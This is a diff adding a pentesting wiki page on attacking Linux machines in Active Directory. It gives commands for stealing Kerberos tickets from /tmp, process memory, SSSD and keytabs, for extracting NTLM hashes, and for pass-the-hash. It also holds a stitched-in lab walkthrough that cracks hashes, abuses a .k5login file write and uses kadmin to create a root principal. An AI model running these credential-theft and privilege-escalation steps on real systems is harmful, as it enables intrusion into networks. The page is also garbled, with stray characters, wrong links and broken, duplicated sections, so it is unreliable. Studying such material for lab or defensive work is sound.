@@ -1,0 +1,258 @@
+# Linux Active Directory
+
+pA linux machine can also be present inside an Active Directory environment.
+
+A linux machine in an AD might be **storing different CCACHE tickets inside files. This tickets can be used and abused as any other kerberos ticket**. In order to read this tickets you will need to be the user owner of the ticket or **root** inside the machine.
+
+### Pass The Ticket
+
+In this page you are going to find different places were you could **find kerberos tickets inside a linux host**, in the following page you can learn how to transform this CCache tickets formats to Kirbi (the format you need to use in Windows) and also how to perform a PTT attack:
+
+```python
+proxychains getST.py -spn cifs/coredc.core.cyber.local@CORE.CYBER.LOCAL -dc-ip coredc.core.cyber.local -k -no-pass "CORE.CYBER.LOCAL/COREWEBDL\$@CORE.CYBER.LOCAL"
+```
+
+### CCACHE ticket reuse from /tmp
+
+> When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
+
+List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be **reused by setting the environment variable** with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID.
+
+```bash
+ls /tmp/ | grep krb5cc
+krb5cc_1000
+krb5cc_1569901113
+krb5cc_1569901115
+
+export KRB5CCNAME=/tmp/krb5cc_1569901115
+```
+
+### CCACHE ticket reuse from keyring
+
+Processes may **store kerberos tickets inside their memory**, this tool can be useful to extract those tickets (ptrace protection should be disabled in the machine `/proc/sys/kernel/yama/ptrace_scope`): [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
+
+```bash
+# Configuration and build
+git clone https://github.com/TarlogicSecurity/tickey
+cd tickey/tickey
+make CONF=Release
+
+[root@Lab-LSV01 /]# /tmp/tickey -i
+[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
+[+] root detected, so... DUMP ALL THE TICKETS!!
+[*] Trying to inject in tarlogic[1000] session...
+[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
+[*] Trying to inject in velociraptor[1120601115] session...
+[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
+[*] Trying to inject in trex[1120601113] session...
+[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
+[X] [uid:0] Error retrieving tickets
+```
+
+### CCACHE ticket reuse from SSSD KCM
+
+SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. By default, the key is only readable if you have **root** permissions.
+
+Invoking \*\*`SSSDKCMExtractor` \*\* with the --database and --key parameters will parse the database and **decrypt the secrets**.
+
+```bash
+git clone https://github.com/fireeye/SSSDKCMExtractor
+python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
+```
+
+The **credential cache Kerberos blob can be converted into a usable Kerberos CCache** file that can be passed to Mimikatz/Rubeus.
+
+### CCACHE ticket reuse from keytab
+
+```bash
+git clone https://github.com/its-a-feature/KeytabParser
+python KeytabParser.py /etc/krb5.keytab
+klist -k /etc/krb5.keytab
+kinit -k -t /etc/krb5.keytab COREWEBDL\$@CORE.CYBER.LOCAL
+kvno host/coredc.core.cyber.local@CORE.CYBER.LOCAL
+download /tmp/krb5cc_uid
+
+```
+
+### Extract accounts from /etc/krb5.keytab
+
+The service keys used by services that run as root are usually stored in the keytab file **`/etc/krb5.keytab`**. This service key is the equivalent of the service's password, and must be kept secure.
+
+Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23 is the actual **NT Hash of the user**.
+
+```
+klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
+[...]
+[26] Service principal: host/COMPUTER@DOMAIN
+	 KVNO: 25
+	 Key type: 23
+	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
+	 Time stamp: Oct 07,  2019 09:12:02
+[...]
+```
+
+On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
+
+```bash
+python3 keytabextract.py krb5.keytab 
+[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
+[+] Keytab File successfully imported.
+        REALM : DOMAIN
+        SERVICE PRINCIPAL : host/computer.domain
+        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
+```
+
+On **macOS** you can use [**`bifrost`**](https://github.com/its-a-feature/bifrost).
+
+```bash
+./bifrost -action dump -source keytab -path test
+```
+
+Connect to the machine using the account and the hash with CME.
+
+```bash
+$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
+```
+
+## Lateral Movement
+
+Having foothold in the system, we can start further enumerating the server. The OpenSMTPD configuration\
+file (/etc/smtpd/smtpd.conf) reveals that authentication is enabled for local TLS connections.
+
+The /etc/smtpd/creds file contains the password hash for j.nakazawa user. We can try to crack this
+
+hash using John The Ripper tool.
+
+Unfortunately is not possible to crack this hash. By enumerating home folders we spot a .msmtprc file.
+
+```
+echo -n
+'$6$EbpPCRMuO/Xwwv51$OVFV3eryJuJnk1vev7WX4JKgU6v8ND0zjXiI0CDMB0E4N6.bsp.2bpmNVUbYPRSIE
+5ex6dS92UbUAvcVdL.M/' > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+```
+msmtp is an SMTP client which can be used to send emails from mail user agents. It requires a configuration
+```
+
+file \~/.msmtprc with all required information in order to function. By checking the contents of this file\
+reveals a plaintext password.
+
+We try to connect to SSH service using the credentials: j.nakazawa / sJB}RM>6Z\~64\_ with no success. As
+
+there's Kerberos service running on the server, these credentials can be used to generate a Kerberos ticket\
+which can then be used to authenticate to the SSH service. We configure the file /etc/krb5.conf as below\
+in our machine.
+
+We add an additional entry to our hosts file.
+
+```
+[libdefaults]
+default_realm = REALCORP.HTB
+```
+
+```
+[realms]
+REALCORP.HTB = {
+kdc = srv01.realcorp.htb:
+}
+```
+
+```
+[domain_realm]
+.realcorp.htb = REALCORP.HTB
+realcorp.htb = REALCORP.HTB
+```
+
+```
+echo '10.10.10.224 srv01.realcorp.htb' >> /etc/hosts
+```
+
+To make sure our local time is synchronized with the time of the KDC, we run ntpdate.
+
+We issue the below command to get a global ticket for j.nakazawa user.
+
+```
+kinit j.nakazawa
+```
+
+Running klist command shows that the ticket is successfully created.
+
+```
+klist
+```
+
+It is now possible to SSH as user j.nakazawa using the Kerberos ticket.
+
+```
+ssh j.nakazawa@srv01.realcorp.htb
+```
+
+User flag can be found in /home/j.nakazawa/user.txt.
+
+```
+ntpdate 10 .10.10.
+```
+
+## Lateral Movement
+
+Enumerating the host we observe an entry in crontab.
+
+We review the contents of the log\_backup.sh script.
+
+This script copies all files from /var/log/squid to /home/admin folder and creates an archive from log
+
+files. It then removes log files from the /home/admin folder. User j.nakazawa is part of squid group and\
+can write to this folder. This gives us the ability to write arbitrary files to /home/admin folder.
+
+According to the MIT Kerberos documentation, .k5login files can be used to grant other users (identified
+
+by Kerberos principals) access to an account without the need of a password. Having already obtained a\
+Kerberos ticket for the j.nakazawa@REALCORP.HTB principal, we can exploit the arbitrary file write
+
+vulnerability to write a .k5login file to /home/admin and obtain access as the admin user.
+
+We issue the below command to write .k5login file to /var/log/squid folder
+
+```
+#!/bin/bash
+```
+
+```
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+```
+
+```
+echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login
+```
+
+After a minute we can login to SSH as admin user.
+
+## Privilege Escalation
+
+By further enumerating the system, we find that the /etc/krb5.keytab file is owned (and readable) by the\
+admin group.
+
+We list the principals in the keytab file issuing the below command.
+
+The kadmin/admin@REALCORP.HTB principal is included in the keytab. This allows us to run kadmin with\
+admin privileges and create the root@REALCORP.HTB principal.
+
+```
+klist -kt /etc/krb5.keytab
+```
+
+```
+kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.htb -q "add_principal -pw test root@REALCORP.htb"
+```
+
+We switch to root user using ksu utility. We provide test when prompted for the password.
+
+## References
+
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)
